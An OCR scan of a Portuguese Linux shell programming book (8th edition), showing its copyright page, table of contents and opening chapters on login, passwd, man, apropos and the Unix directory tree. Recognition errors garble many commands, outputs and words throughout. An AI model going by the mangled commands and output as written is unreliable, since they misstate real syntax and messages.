ATUALIZADO COM AS NOVIDADES DO BASH 4.0 
APRENDA A PROGRAMAR O SHELl DO LINUI E DO UNIX 
PROGRAMAÇÃO AWK 
Contêm todos 
os exercidos do 
livro resolvidos e 
alguns scrípts úteis 
GUIA COMPLETO DE EXPRESSÕES REGUlARES NO BASH E NO OPENOFFIClORG 
ESCREVA CGis COM SHELL SCRIPT 
Copyright© 2010 por Brasport Livros e Multimídia Uda. 
Todos os direitos reservados. Nenhuma parte deste livro podera ser reproduzida, sob qualquer meio, 
especialmente em fotocópia (xerox), sem a permissão, por escrito, da Editora. 
1• edição: 2000 
2• edição: 2001 
3• edição: 2003 
Reimpressão: 2003 
4• edição: 2004 
s• edição: 2005 
Editor: Sergio Martins de Oliveira 
Diretora Editorial: Rosa Maria Oliveira de Queiroz 
Reimpressão: 2005 
6" edição 2006 
Reimpressão: 2006 
7• edição: 2008 
Reimpressão 2009 
a• edição: 2010 
Assistente de Produção: Marina dos Anjos Martins de Oliveira 
Revisão: Patrícia Sotello Soares 
Editoração Eletrônica: Abreu's System 
Capa: Use Design 
Técnica e muita atenção foram empregadas na produção deste livro. Porém, erros de digitação e/ou impressão podem 
ocorrer. Qualquer dúvida, inclusive de conceito, solicitamos enviar mensagem para braspoJt@braspo1t.com.b1; para que 
nossa equipe, juntamente com o autor, possa esdare<:er. A Braspoft e o(s) autor(es) não assumem qualquer responsabi· 
lídade por eventuais danos ou perdas a pessoas ou bens, originados do uso deste livro. 
Dados Internacionais de Catalogação na Publicação (CIP) 
(Cãmara Brasileira do Livro, SP, Brasil) 
Neves, Julio Cezar 
Programação SHELL LINUX I Julio Cezar Neves. --
8. ed. - Rio de Janeiro : Brasport, 201 O. 
ISBN 978-85-7452-440-5 
1. LINUX (Sistema operacional de computador) 
2. UNIX Shells (Programa de computador) I. Titulo. 
10-04576 
indices para catalogo sistemático: 
1. LINUX : Sistema operacional : Computadores : 
BRASPORT Livros e Multimídia Lida. 
Rua Pardal Mallet, 23 - lijuca 
20270-280 Rio de Janeiro-RJ 
Processamento de dados 005.43 
Tels. Fax (21) 2568.141512568.150712569.0212/2565.8257 
e-mails: brasport@brasport.com.br 
vendas@brasport.com.br 
ediloríal@brasport.com.br 
site: www.brasport.com.br 
Filial 
Av. Paulista. 807 - conj. 915 
01311-1 00 - São Paulo-SP 
Tel. Fax (11): 3287.1752 
e-maíl: fílíalsp@brasport.com.br 
CDD-005.43 
Material com direitos autorais 
-IC 
** 
• 
B~ • 
- •-
* 
,., 
ramaçao 
8ll edição 
Julio Cezar Neves 
Sumário 
Parte I 
Ca ítulo 1. Come ando deva arinho ....................................................... 3 
Iniciando uma sessão Linux ..................................................................... .. ....... 3 
Encerrando uma sessão Linux - exit, logout ......... .................................. ......... 4 
asswd - Alterando a senha .. .. .............................................................. .. 4 
Comandos ..................................................... ......... , ............................. .... 5 
Obtendo ajuda .... ....... . .......................... ..... .. . ........ ........... ... 6 
help - Ajuda . .......... .............. ... . .................................... ........ 6 
man pages - Manual de Referência ......... ... ................... ... . . . .. 7 
apropos - Informações sobre um tópico ....... ...... . .............................. 9 
whatis - Descrição de comandos .............................................. ......... 10 
Ca ítu lo 2. Mani ulando ar uivos e diretórios ..................................... 11 
Sistema de arquivos do Unix ........................................................................... 11 
Operações com o sistema de arquivos .................. ............................... .......... 12 
Caminhos de diretórios (paths) ............................................................ .......... 13 
pwd - Informa nome do diretório corrente .............. ............................... 15 
cd- Navegando entre diretórios ............................. ............................... 15 
ls -lista arquivos .............................................. .................................... 16 
cp - Cópia de arquivos e diretórios ............... ............................... .......... 18 
mv - Move arquivos e diretórios ............................................................ 19 
In- Estabelece ligações entre arquivos ........ ......................................... 20 
mkdir - Cria um diretório ............................... .......... ..................... .......... 22 
rmdir - Remove diretório ........................................................... ............. 22 
rm - Deleta arquivos e diretórios .................. ....................................... 23 
file - Indicando tipo de arquivo ..................... ...................... ......... .. 24 
Matenal com dlreilos aL•Iora1s 
XXXII Programação Shell Linux 
grep - Pesquisa arquivos por conteúdo ................................................. 24 
find - Procurando ar uivo or características ........................................ 25 
basename - Devolve o nome de um ar uivo ... ...................................... 32 
djrname 
Devolve o nome do diretório 
32 
C a 
cat- Exibe o conteúdo de um arquivo .................. ................................. 34 
wc- Conta caracteres, palavras e/ou linhas .......... ................... .. .......... 36 
sort - Classifica dados 
38 
bead - Mostra início dos dados 
41 
tail - Mostra final dos dados 
41 
Capítulo 4. Segurança de Acesso ........................................................... 43 
Posse de Arquivos ....................................................... .................................... 43 
chown - Trocando dono do arquivo ....................................................... 44 
ch r -Trocando o ru o do ar uivo .................................................... 45 
Tipos de Acesso a Arquivos ............................................................................ 45 
Classes de Acesso a Arquivos ........................................................................ 46 
chmod - Ajustando permissões de arquivos .......................................... 47 
Capítulo 5. Comandos para Informações sobre Usuários .......................... 50 
who- Usuários ativos ............................................................................ 50 
id - Identificadores do usuário ............................................................... 51 
finger - Detalha informações sobre usuários ......................................... 52 
chfn - Altera dados do fin e r ................................................................. 53 
groups - Informa grupos dos usuários ................................................... 54 
Capítulo 6. Pra não Perder o Compromisso .......................................... 55 
date - Mostra e acerta data/hora ........................................................... 55 
.cal - Exibe o calendário 
57 
C a ítulo 7. Beca eando ........................................................................... 59 
compress - Para compactar dados .................................................. ..... 61 
uncompress - Descompactando arquivos ............................................. 62 
zcat - Visualizando dados compactados ............................................... 63 
gzip - Compactado r livre ...................................... ............................ ..... 63 
gunzip - Descompaclador livre .............................................................. 65 
Capítulo 8. Controle de Execução .......................................................... 66 
ps - Lista de processos ......................................................................... 68 
kill - Enviando sinal a processos ........................................................... 69 
Matenal com direitos aL•Iora1s 
Sumário 
XXXIII 
Execução em Background .............................................................................. 70 
'obs - Lista · recessos sus ensos e em back round ............................. 71 
b - Manda recessos ara back round ............................................... 71 
fg - Trazendo processos para foreground .............. ............................... 72 
Ca ítulo 9. Executando Tarefas A endadas .......................................... 73 
Programando tarefas com crontab .................................................................. 73 
O comando at .................................................................................................. 76 
O comando batch ............................................................................................ 78 
Parte 11 
Leiame.txt .................................................................................................. 81 
Ca ítulo O. O Básico do Básico .................................. u .... .
.
.
.
.
. .
. ..... .
.
.
. ..... 84 
Visão geral do sistema operacional UNIX .............. ......................................... 84 
Quem não é movido a gasolina, precisa de Snell? .......... ..................... .......... 85 
Por que Shell? .............................................................. ........................... ..... 88 
Tarefas do Sbell 
88 
Exame da linha de comandos recebida , ................................................ 89 
Resolução de redirecionamentos ....... : .............................................. ..... 90 
Substituição de variáveis ....................................................................... 90 
Substituição de meta caracteres ......................... ..... .......................... ..... 90 
Passa linha de comando para o kernel... ............................................... 90 
Principais Shells .............................................................................................. 91 
Bourne Shell.., .. ,,, ,, ..... , .. ,, .. , ......... ,, , ........ ,, .............. ,, .................. , .... , 91 
Bourne-Again Shell ................................................................................ 91 
Korn Shell 
91 
C Shell. ................................................................................................... 92 
Sem comentários .. .............. ................. ,,, .. , , , , ., ,,, ,, .............. , ,, .., 93 
. 
Capítulo 1. Recordar é Viver .................................................................... 94 
Usando aspas, apóstrofos e barra invertida .................................................... 94 
Crase e parênteses resolvendo crise entre parentes ...................................... 95 
Direcionando os caracteres de redirecionamento,, ... ... , ....... .... , ... ...... , 98 
Exercícios 
101 
Matenal com direitos aL•Iora1s 
XXXIV Programação Shell Linux 
Ca ítulo 2. Comandos ue- não são do Planeta .................................. 103 
O ed é d+ 
103 
O comando sed ........................................... ........... .. ....•..•.......................... 108 
A opção -n ...... ........................ ....................... ............................... ... 117 
A opção -i ............................................................................................. 118 
A familia de comandos grep .......................................................................... 121 
A opção -c (count ou contar) ................................................................ 124 
A opção -1 ......... ..................... .............................................................. 1.25 
A opção -v .............................. .............................................................. 126 
A opção -f (file) ..................................................................................... 126 
A opção -o (only matching) .................................................................. 128 
Os comandos para cortar e colar .................................................................. 130 
Cortando cadeias de caracteres - cut .................. .. ............................. 130 
Colando cadeias de caracteres - paste ............................................... 133 
A opção -d (delimitador) ..... .... ....................... ....... ....................... 134 
A opção - s ........................................................................................... 134 
Perfumarias úteis ................................................................................. 135 
O tr traduz. transcreve ou transforma cadeias de caracteres? ..................... 136 
A o ão -s ........................................................................................... 141 
A opção -d ........................................................................................... 142 
A opção -c ........................................................................................... 143 
Exprimindo o expr de forma expressa ................................................ ........... 144 
Execução de operações aritméticas ........................................ .... .... 144 
bc - A c a lcll I adora 
145 
O interpretador aritmético do Shell ................................................................ 147 
O uniq é único ............................................................................................... 153 
A o ão -d ........................................................................................... 154 
Mais redirecionamento sob o Bash 
155 
Exercício 
156 
Capítulo 3. Viemos aqui para falar ou para programar? ..................... 157 
Executando um programa (sem ser na cadeira elétrica) .............................. 157 
Usando variáveis ........................................................................................... 158 
Para criar variáveis .......................................... .................................... 158 
Para exibir o conteúdo das variáveis 
159 
Passando e recebendo parâmetros .............................................................. 160 
O comando que passa parâmetros ............................................................... 163 
Desta vez vamos. 
168 
Programa para procurar pessoas no arquivo de telefones .................. 169 
Programa para inserir pessoas no arquivo de telefones ...................... 170 
Matenal com direitos aL•Iora1s 
Sumário 
XXXV 
Programa para remover pessoas do arquivo de telefones .................. 172 
Exercícios 
173 
Ca ítulo 4. Liberdade condicionalll ...................................................... 174 
O bom e velho i f ............................................................................................ 175 
Testando o test . .. 
. . 
. . 
. . . 
. . . 178 
O test de roupa nova ............................................................................ 185 
Se ai uém disser ue eu disse, eu ne o ............................................. 186 
Não confunda and com The End ......................................................... 187 
ar ou ou disse o cão afônico 
188 
Disfarçando de if ................................................................... ...................... 189 
&& (andou ª lógico) ........................................................................ .. ... 189 
li (QI ou ou lógico) .... .............. ...... ...... .. ..... .. . .. .... ............ .... .. 190 
Operadores aritméticos para testar ...................................................... 191 
E tome de test 
. . 
... . 
.. . 
.. .. 
. . . ... 
. .. 192 
O caso em que o case éasa melhor .. ............................. .. ............................. 195 
Exercícios ................................... ....................... ... ....................... ... 201 
Ca ítulo 5. De Lu a no Loo ................................................................. 202 
O forró do for ............................................. .................................................... 203 
Perguntaram ao mineiro: o que é while? while é while, uai! ......................... 212 
O until não leva um- mas é útil. ................................................................... 214 
Continue dançando o break .......................................................................... 218 
Exercício .................................................................... .................................... 220 
Ca ítulo 6. A rendendo a ler ................................................................. 221 
Que posição você prefere? ...................................................................... .. ... 221 
Afinal como é que se lê? ............................................................. ............. .. ... 228 
Leitura dinâmica 
237 
Leitura sob o Bash .................................................... .................................... 239 
Opção -p ....................................................... ....................................... 239 
Opção -t ............................................................................................... 239 
Opção -n ....................................................... ............................... ........ 240 
Opção -s ........................................................ ..... .......................... ..... ... 241 
Opção -a ..................................................................................... ........ 241 
Outra forma de ler e gravar em arquivos ...................................................... 241 
Já sei ler. Será que sei escrever? ................................................................. 243 
Exercícios ...................................................................................................... 246 
Matenal com dlreilos aL•Iora1s 
XXXVI Programação Shell Linux 
Capítulo 7. Várias variáveis ................................................................... 248 
Exportar é o que importa ............................................................................... 249 
É . e pronto .................................................................................................... 255 
Principais variáveis do sistema .................................................................. ... 257 
Parâmetros 
263 
Construções com parâmetros e variáveis ............................................ 264 
Expansão de chaves { ... }' ............................................................................. 27 4 
Ganhando o jogo com mais curingas ............................................................ 276 
Um ou co de mani ula ão de vetores ................................................. 282 
Exercícios ...................................................................................................... 290 
Capítulo 8. Sacos de gatos .................................................................... 291 
A primeira faz tchan, a segunda faz tchun, e tchan, tchan, tchan ................. 291 
wait a minute Mr. Postman ............................................................................ 296 
Para evitar trapalhadas use o trap ......................................................... ....... 297 
Funções ......................................................................................................... 301 
Substituição de processos ................................................................... 309 
Mergulhando fundo no nautilus ..................................................................... 317 
Instalando scripts do gerenciador de arquivos ..................................... 317 
Escrevendo scripts do gerenciador de arquivos .................................. 318 
Ex em lo.s de se ri ts ............................................................................. 320 
script também é um comando ...................................................................... 326 
Fatiando o ões ........ ................. .. ............ ........................................ .......... ... 328 
Em busca do erro perdido ............................................................................. 331 
Mandando no terminal. .................................................................................. 333 
Macetes, macetes & macetes ....................................................................... 338 
Exe~ ic i os 
340 
A êndice 1. awk: Comando ou Lin 
em? ....................................... 341 
O Be-a-bá do awk ........................................................................................ 342 
Uso do awk 
, , 
343 
Campos ................................................................................................ 343 
Listando ................................................................................................ 344 
Formando padrões ........................................................................................ 346 
Expressões relacionais ........................................................................ 346 
Expressões regulares .......................................................................... 348 
Matenal com dlreilos aL•Iora1s 
Sumário 
XXXVII 
Padrões BEGIN e END ........ , .. , .. ,,,,,, .... , ........ ,,,,, , . .... 351 
O uso de variáveis ......................................................................................... 352 
Faz de conta ........................................ .. .......................... ..... , ....................... 355 
Operadores ................................. ......................................................... 356 
Funções matemáticas ....................................................................... ... 357 
Prá cadeia . , .. , .. ,. ,, . , , .......... , , , ,,, , ... , , ., ,, ....... , , .... , , ., ,, ........ , , , . 357 
Instruções de controle de fluxo ..................................................................... 361 
O comando if ....................................................................................... 362 
O comandowhile ............. ...... ............... . ... ........ ... ........................ 363 
for midável. ........................................................................................... 364 
break e outros bric-a-bracs ..................................... ............................. 365 
Valores de vetores ........................... ....................... ....................................... 365 
print e printf parece mas não é ..................................................................... 368 
A saída com prínt ................................................................................. 368 
Formatando a saída com printf ............................................... ............. 369 
Como redirecionar a saída com rintf? ................................................ 370 
O awk no contexto do Shell .......... , .. , , .................. , ...... , .. , ..................... , .. 3 72 
Recebendo parâmetros ........................................................................ 373 
Em cooperação com o Shel/ . ......................... ....... ................ ....... 373 
A êndice 2. Ex ressões re ulares ....................................................... 377 
Um pouco de teoria .................................................................................. ..... 378 
Conceitos básicos . .. ............ .... .. ..... . .......... ... . .......... . 378 
História .......... .... ...... ......................... ................ .............................. . 379 
Então vamos meter as mãos na massa ........................................................ 380 
Âncoras ................................................................................................ 381 
Representantes ............................................................................... .. ... 383 
Quantificadores .................................................................................... 384 
Fingindo ser lista ......................... ...................................................... ... 390 
Outros 
Z9 
Expressões Regulares (no BrOffice.org) ............................................... ........ 408 
Onde usar Expressões Regulares no BrOffice.org .............................. 409 
Diferenças na lógica de uso ................................................................. 410 
Diferenças de sintaxe ............. .......................... .................................... 412 
A êndice 3. CGI em Shell Scri t ........................................................... 420 
Configuração .......................................... .................................................. .. ... 420 
Algumas considerações importantes ................................................... 422 
Diversão ............. ............................. ................................. ............................. 422 
IniCiando 
422 
Método GET ................................................... ..................................... 426 
Matenal com direitos aL•Iora1s 
XXXVIII Programação Shell Linux 
Método POST ...................................................................................... 427 
U load ...................................... ... .. ............................... ........................ 429 
CheckBox 
431 
Radio Buttons ................................................ ....................................... 432 
Contador de acesso genérico ............................... .. ..................... ........ 433 
SSI - Server Side lncludes .................................................................. 434 
Contador ..................................... ......................................................... 434 
Segurança .................. ...................................................... ............................. 436 
Introdução e Configuração ............................... .................................... 436 
LAN 
44 
Livro de assinaturas .................................................. .................................... 445 
A êndice 4. Dia lo ................................................................................. 450 
Por que este doéumento existe ..................... ....................................... 450 
Objetivo e Escopo Deste Documento ........... ....................................... 451 
Últimas Palavras Antes de Iniciar. 
. . . . 
. . 
. 452 
Introdu ão ..................................................................................................... 452 
O ue é o Dialo .................................................................................. 452 
Breve Histórico do Di'alog ..................................................................... 453 
Seu Primeiro Comando com o Dialog .................................................. 453 
Listagem dos 15 Tipos de Caixas ......................... ............................... 454 
Exemplos dos Tipos de Caixa ............................................................ 455 
Como o Dialog Funciona ....................................................................... ........ 460 
Parâmetros Obrigatórios da Linha de Comando .......................... ........ 461 
Como reconhecer respostas SIM ou NÃO ........................................... 462 
Como Obter o Texto Que o Usuário Digitou ......................................... 464 
Como Obter o Item Único Escolhido de um Menu ou Radiolist ........... 466 
Como Obter os Itens Múltiplos Escolhidos de um Checklist.. .............. 4 70 
E se o Usuário Apertar o Botão CANCELAR? ..................................... 472 
E se o Usuário Apertar a Tecla ESC? ........................ .......................... 473 
E se o Usuário Apertar o botão HELP? ............ .. .................................. 473 
Como Tratar Todos os Botões e Teclas de Uma Vez? ................. ........ 4 7 4 
Mergulhando de Cabeça no Dialog ................................ ....................... ........ 474 
Exemplo de Menu Amarrado (em Loop) .............................................. 474 
Exemplo de Telas Encadeadas (Navegação Sem Volta) ..................... 476 
Exemplo de Telas com Navegação Completa (Ida e Volta) ................. 477 
Exemplo de Pedido de Confirmação (Uma Caixa Sobre Outra) .......... 480 
Exemplo de Posicionamento de Caixas (Não Centralizado) ............... 481 
Exemplo de Várias Caixas na Mesma Tela (Multicaixas!) ................... 482 
Exemplo de Menu com Itens Dinâmicos (Definidos em Execução) ..... 484 
Exemplo de Cópia de Arquivos com Barra de Progresso (Gauge) ...... 486 
Configurando as Cores das Caixas ..................................................... 489 
Matenal com direitos aL•Iora1s 
Sumário 
XXXIX 
Lista das Opções de Linha de Comando ............................................ .......... 492 
Opções para definir os textos da caixa ................................................ 492 
Opções para fazer ajustes no texto da caixa ....................................... 492 
Opções para fazer ajustes na caixa ..................................................... 493 
Opções relativas aos dados informados pelo usuário ............ ............. 494 
Outras 
49 
Opções que devem ser usadas sozinhas na linha de comando .......... 495 
Os Clones: Xdialog, Kdialog, gdialog ................ ...... .. .. ........ ............. 495 
Whiptail ................................ ................................................................ 496 
Xdialog ................................................................................................. 496 
................................................................................................. 497 
.................................................................................................. 498 
Zenity 
39 
Udpm 
09 
pythondialog ......................................................................................... 499 
Onde Obter Mais Informações ...................................................................... 499 
A 
Usandó o wget com proxy .................................................................... 506 
Arquivos de configuração ........................................... .......................... 507 
Brincando pela rede com o netcat... .............................................................. 51 3 
Coisas do bem ................................................... .................................. 514 
Coisas do mal ...................................................................................... 517 
Resumo ............................................................ .................................... 519 
Apêndice 6. Significado das Opções mais Frequentes no Shell. ...... 520 
A êndice 7. Resolução dos Pro ramas ............................................... 522·· 
• lndice Remissivo .................................................................................... 535 
Matenal com direitos aL•Iora1s 
Material com direitos autorais 
Parte I 
Matenal çorn d1re1tos at,tora1s 
Material com direitos autorais 
1 ·f ·~~ l Capítulo 1 
. 
. . . 
•Iniciando uma sessão Linux 
Toda sessão no Linux começa com uma solicitação de um 
nome de login. Após o usuário informar o seu login, uma 
senha é solicitada. Por motivos óbvios, a senha digitada 
não aparece na tela. Um detalhe a ser observado é que o 
Linux faz distinção entre letras maiúsculas e minúsculas. 
Senhas que diferem em pelo menos um caractere maiús-
culo/minúsculo são consideradas diferentes. 
Sempre que um usuário digita seu nome de login e se-
nha corretamente, um Shelf é invocado e a partir dele o 
usuário passa a dar comandos e interagir com o sistema: 
Cone c tiva Linux 
7 . 0 
Kernel 2 . 2 . 19- lScl 
l ogin : d 327760 
Passv,ord : 
La s t. login: Non May 27 11 : 36 : 55 f.rom lxrjd090 
$ 
O superusuário, conhecido como root, é também o res-
ponsável por cadastrar os usuários, dando para cada um 
o nome de login correspondente. A senha é deixada em 
branco, e o sistema solicita a mudança de senha na primei-
ra vez em que o usuário se ''logar". O superusuário pode 
também definir Shells específicos para cada usuário. 
3 
Material com direitos autorais 
4 
Programação Shell Linux 
Encerrando uma sessão Linux - exit, logout 
Como em todo sistema multiusuário, assim que terminar seu trabalho cada 
usuário deve encerrar sua sessão. Dois comandos realizam esta tarefa: exit 
e logout . O comando l ogou t encerra de uma vez a sessão do usuário, já 
o comando exi t encerra somente o Shell corrente. É aconselhável sempre 
utilizar o comando exit em vez de l ogout , pois pode haver uma situação 
em que o usuário tenha invocado um She/1 a partir de outro. 
Exemplos: 
$ exit 
ou 
$ logout 
Para l ogout , pode-se usar também a combinação de teclas <ct r l >d , 
mas esse recurso nem sempre está habilitado. 
$ 'd 
passwd - Alterando a senha 
Sintaxe: 
passwd [ usuario) 
O comando passwd permite a um usuário mudar sua própria senha, ou 
ao superusuário mudar a senha de qualquer usuário. Alguns sistemas pe-
dem a senha antiga antes de solicitarem a nova. Algumas implementações 
do Unix criticam de forma severa a nova senha, quer seja impondo limites 
mínimos de tamanho ou combinações de letras maiúsculas, minúsculas e 
números. Esses aspectos de segurança visam evitar que usuários não au-
torizados descubram senhas dos usuários do sistema. 
Exemplo 
$ passwd 
Changi ng passvTo rd for use r jneves . 
Changing passv1ord f o x j neves 
(currenc) UNIX pass>To rd : 
Material com direitos autorais 
Começando devagarinho 
5 
Ne\o~ password : 
BAD PASSWORD: it is based on a dicti onary v1ord 
Ne\..r pass\\rord : 
BAD PASSWORD: it is based on a dicti onary v1ord 
New pa ss\•to r d : 
BAD PASSWORD: it is based on a dict i onary word 
pa SS\vd : Aut:hentication token manipulation e r ror 
No exemplo anterior, tentei alterar por três vezes a minha senha para 
j ulianaOO , os algoritmos de comparação do passwd inferiram que, em 
virtude do meu nome ser julio, a senha que estava propondo era muito 
óbvia e a alteração não se processou. 
$ passwd 
Changi ng passv1ord for usex j neves. 
Changing pass·\tlord f o r jneves 
(current) UNI X passv1ord : 
Netv pass;vord : 
Retype new passvrord: 
passtvd : all authenticat:i on tokens updated successfully . 
Agora sim, a senha foi alterada. 
Comandos 
Em linha de comando, o Linux oferece uma grande variedade de coman-
dos a serem usados. Após pressionar o <ENTER> os comandos informados 
são examinados pelo She/1 e após são passados para o Linux, que inicia a 
ação apropriada ou exibe uma mensagem de erro. 
De um modo geral os comandos do Unux têm a seguinte forma: 
$ comando (- opções ... ] (a rgument os ... J 
Exemplos: 
$ who 
$ who -H 
$ who am ~ 
Só o comando 
Comando e opçào 
Comando e argumentos 
Os comandos do Shell, nessa parte do livro, referem-se todos ao Bour-
ne-Again Shell (bash). 
Material com direitos autorais 
6 Programação Shell Linux 
Obtendo ajuda 
O Linux oferece diversas formas de ajuda aos seus usuários: 
.J 
Comandos para pedir Ajuda 
he l p 
Mostra informações gerais sobre os built-ins do Shell 
mam 
Mais 
do Linux 
apropos Mostra 
sobre um 
Obtém uma breve de~;cn<çào de um comando do sistema 
help- Ajuda 
O comando help é utilizado para mostrar informações gerais dos built-ins 
do She/1 (chamam-se built-in os comandos que são incorporados ao She/1, 
isto é, não são instruções autônomas como o who , por exemplo. São co-
mandos cujos códigos se encontram incorporados ao código do She/1). Este 
comando é muito útil para novos usuários. 
Exemplo: 
$ help 
GNU bash, version 2 . 05b . O(l) - rel ease (i38 6- redhat- linux- gnu) 
These shell commands a r e defined internally. 
Type 'help ' to see thi s 
list . 
Type ' help name' to find out more about the f unct ion 'name ' . 
Use 'info bash ' to find out more about the shel l i n general. 
Use ' rnan - k ' o r ' i nfo ' to find out more a bout. conunands not in t his l is t . 
A star (*) next to a name means that the command is disabled . 
%[DIGITS I WORD) 
[ & l 
(( express~on ) ) 
. filename 
[ a rg . . . l 
[ [ express~on l l 
ali as [ -p 1 [name(=value ) . . . I 
bg [ j ob _.spec J 
. . . . . 
Matcnal com direitos al'lora1s 
Começando devagarinho 
7 
man pages - Manual de Referência 
Sintaxe: 
man [- aP] [seção] t ópi co 
A documentação padrão do Linux, chamada de man pages , contém aju-
da para todos os comandos padrão do Unix. Para que o sistema também 
contenha man pages de utilitários e aplicações não padrão, estes devem 
encarregar-se de incluí-las automaticamente durante sua instalação. 
Sempre digo que o man é o comando mais importante, pois é a única 
"pessoa" que conhece todos os comandos com as respectivas opções. 
O Manual de Referência do Unix é dividido em oito seções: 
Subdivisões das man-pages 
1. Comandos de usuários 
Comandos que podem ser 
executados a partir de um Shell 
2. Chamadas de sistema 
Funções que têm de ser 
executadas pelo kernel 
3. Bibliotecas de funções 
A maioria das funções da 
biblioteca libc 
4. Formatos de arquivos 
Drivers e hardware 
especiais 
5. Arquivos de configuração 
Formatos de arquivos e 
convenções 
6. Jogos e demonstrações 
bis 
7. Pacotes de macro e 
Sistemas de arquivos, 
protocolos de rede, códigos 
convenções 
ASCII e outros 
8. Comandos de administraçã0 Comandos que muitas vezes 
do sistema 
apenas o root pode executar. 
O comando man apresenta todos os tópicos do manual Linux, de uma 
forma semelhante ao manual impresso. Entretanto, man é o utilitário de 
documentação padrão e está presente em qualquer Unix, além de seus 
comandos serem os mesmos em qualquer sistema. 
Matenal çorn d1re1tos at,tora1s 
8 Programação Shell Linux 
arãmetro Função 
-a 
-p 
seção 
tópico 
Encontra todas as páginas que coincidam com o 
padrão 
Indica um programa paginador alternativo 
Indica uma das oito seções do manual a procurar 
Indica qual tópico procurar. O tópico deve ser exa-
tamente o nome de comando, chamada de siste-
ma, etc 
Ao encontrar o tópico solicitado, o programa aceita comandos direta-
mente do teclado. Os principais são: 
Comando Ação 
h 
Mostra a ajuda do man 
q 
Sai doman 
--~ -------------------------------~ 
[ N)e 
Avança uma linha, ou N linhas, quando especificado 
Exemplos: 
$ man l ls 
LS (1} 
NOME 
[N)y 
Volta uma linha, ou N linhas, quando especificado 
f ------------~------~~--~---------
Avança uma tela 
b 
Volta uma tela 
/texto 
Procura por um texto no texto apresentado pelo man 
ls, di r, vdir - list a o conteúdo do diret ório 
S INOPS E 
ls [opções ] (arqui vo ... ] 
di r [arquivo ... ) 
vdi r [arquivo .. . ) 
$ man passwd 
PASSWD (5} 
NOME 
Format os de Arqui vo 
pas svtd -
arquivo d e senhas 
DESCRI ÇÃO 
LS ( 1) 
PASSIID ( 5} 
Passwd é um a rquivo t e xto , que contém a lista de contas do s i ste -
ma, fornecendo para cada cont a qual quer inf ormação út i l como i dentificação 
numéri c a do usuário . .. 
Matenal çorn d1re1tos at•tora1s 
Começando devagarinho 
9 
apropos- Informações sobre um tópico 
Sintaxe: 
apr opos tópico 
Uma facilidade bastante interessante existente em sistemas Unix/Linux 
é o comando a p ropos . Este comando consulta um banco de dados consis-
tindo da descrição do comando. É bastante útil em situações em que se de-
seja executar determinada tarefa e não se conhece o nome do comando. 
Por exemplo, caso eu não me lembrasse qual era o compilador C insta-
lado no meu sistema, eu poderia digitar: 
$ apropos compilar 
cccp, cpp {1} 
-
Th e GNU C-Compati bl e Cornpiler Pr.epr.ocessor . 
g++ 
(1) 
-
GNU p roject C++ Compiler 
gcc , g++ ( 1 ) 
-
GNU p roject c and C++ Compile r 
(v 2 . 7) 
Uma vez de posse dessa informação eu digitaria então 
$ man gcc 
para obter informações específicas sobre o compilador gcc. 
Observe que os sublinhados no exemplo foram meus, para mostrar que 
o comando apropos procurou a palavra (no caso compHer) em todo o ban-
co e não somente no rol das instruções. 
Todavia, este banco de dados não é criado automaticamente. O adminis-
trador de sistemas precisa criar este banco de dados através do comando 
c a tman . Esse comando irá varrer todos os diretórios especificados na variá-
vel de ambiente MANPATH e irá construir um arquivo chamado wha t i s , onde 
irá colocar as descrições dos programas. Caso não exista esse arquivo, ao 
se 1nvocar o apropos uma mensagem parecida com esta será exibida: 
$ aprop os compilar 
apropos : fi l e 
/ us r/ local /ma nh~hat is not found 
Create t he Hha.t is database us i ng t he catma n - ;.v conunand . 
Material com direitos autorais 
10 Programação Shell Linux 
Para construir esse banco de dados, emitir o comando: 
$ catman -w 
Uma vez criado o banco de dados, o comando apropos (ou man - k) po-
derá então ser utilizado. 
Exemplos: 
. . 
No intuito de mostrar a diferença entre este comando 
mo (whatis) , os exemplos dos dois serão iguais. 
(apr opos) e O prOXI-
$ apropos chmod 
chmod 
chmod 
fchmoct [chmod] 
$ apropos ifconfig 
ifconfig 
( 1) 
(2) 
(2) 
-
( 8) 
-
change fil e ac.:cess 
change per mi ss i ons 
change per miss i ons 
configure a networ k 
whatis - Descrição de comandos 
Sintaxe: 
whati s tópi co 
pexmissions 
o f a fil e 
o f a fil e 
int erface 
O comando whatis obtém uma breve descrição de um comando do 
sistema. 
Exemplos: 
$ whati s chmod 
chmod 
chmod 
$ whati s ifconfi g 
ifconfig 
$ whati s cornpi ler 
(1 ) 
(2) 
change file access perrnissions 
change pe r missions of a file 
(8) 
-
configure a netV~o.t:k int e.rface 
compiler : nothing apl(ropxiate 
Material com direitos autorais 
? :~ ·~~ j Capítulo 2 
I 
\ 
: 
f , I 
. 
: 
• 
• 
: dtretortos 
. . . 
• Sistema de arquivos do Unix 
No sistema operacional Unix/Linux, costuma-se dizer que 
"tudo" é arquivo. Isto se deve ao fato de o sistema opera-
cional tratar de modo semelhante tanto arquivos comuns 
como dispositivos de sistema. 
O sistema de arquivos do Unix/Linux é hierárquico. A 
base desta árvore é um diretório chamado diretório raiz, 
representado por 1 (o caractere barra). Enquanto outros 
sistemas operacionais tratam individualmente discos e 
partições, o Unix/Linux considera todos os dispositivos, 
discos, arquivos e diretórios como um todo, alocando-os 
numa única árvore do sistema de arquivos. 
Nos sistemas Linux/Unix cada diretório da árvore ar-
mazena arquivos segundo sua função, seguindo (mais ou 
menos) o padrão apresentado na página seguinte. 
Os arquivos não possuem tamanho previamente deter-
minado. Quanto à estrutura interna dos arquivos, o Unix! 
Linux não faz nenhuma restrição. Um arquivo pode conter 
qualquer sequência de bytes, proporcionando grande fle-
xibilidade ao sistema. 
Os nomes de arquivos podem ter quantidades máxi-
mas de caracteres diferentes para sistemas operacionais 
diferentes. Nos antigos Unix tradicionais ( System V), o 
11 
Material com direitos autorais 
12 Programação Shell Linux 
limite era de 14 caracteres. Nos modernos Unix baseados no BSD, o limite 
é 256 caracteres. 
J Diretório 
Tipos de Arquivos 
/bin 
Utilitários principais do Unix 
/etc 
Programas e arquivos administrativos 
/lib 
Bibliotecas de funções, programas e dados 
/tmp 
Arquivos temporários 
/home/jneves Arquivos do usuário jneves 
/usr/bin 
Utilitários 
/usr/sbin 
Utilitários usados somente pelo "root" 
/usr/include Arquivos de cabeçalho (por exemplo, da linguagem C) 
/usr/lib 
Bibliotecas de funções 
/usr/spool 
Áreas de spool (por exemplo, de mail e impressora) 
•• 
/dev 
Arquivos especiais de dispositivo 
No Unix/Unux não existe o conceito de extensões para nomes de arqui-
vo. Podemos até usá-las para facilitar a compreensão dos tipos de arquivos, 
mas não são de modo algum obrigatórias. Um arquivo chamado apostila.txt 
será visto pelo sistema como apostila . t xt e não como apostila extensão 
t xt . Isto é especialmente útil quando usamos algo que poderíamos cha-
